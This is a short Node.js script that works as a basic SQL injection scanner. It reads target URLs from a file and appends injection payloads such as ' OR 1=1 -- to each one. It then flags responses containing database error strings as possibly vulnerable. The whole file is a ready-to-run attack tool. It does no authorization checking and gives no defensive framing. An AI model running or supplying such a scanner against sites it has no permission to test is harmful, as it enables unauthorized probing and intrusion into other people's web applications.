const axios = require('axios');
const fs = require('fs');
const readline = require('readline');
const colors = require('colors');

const payloads = ["'", "' OR 1=1 --", '" OR 1=1 --'];

async function testURL(url) {
    for (let payload of payloads) {
        try {
            const testUrl = url + payload;
            const response = await axios.get(testUrl);
            const data = response.data.toLowerCase();

            if (data.includes('error') || data.includes('mysql') || data.includes('syntax')) {
                console.log(`[!] Possible SQLi detected: ${testUrl}`.red);
            } else {
                console.log(`[+] Payload safe: ${testUrl}`.green);
            }
        } catch (err) {
            console.log(`[X] Error testing ${url}: ${err.message}`.yellow);
        }
    }
}

async function main() {
    if (!fs.existsSync('urls.txt')) {
        console.log('urls.txt file not found!'.red);
        process.exit(1);
    }

    const fileStream = fs.createReadStream('urls.txt');
    const rl = readline.createInterface({
        input: fileStream,
        crlfDelay: Infinity
    });

    for await (const line of rl) {
        const url = line.trim();
        if (url) {
            console.log(`\nTesting URL: ${url}`.blue.bold);
            await testURL(url);
        }
    }

    console.log('\n[✔] Testing completed!'.cyan.bold);
}

main();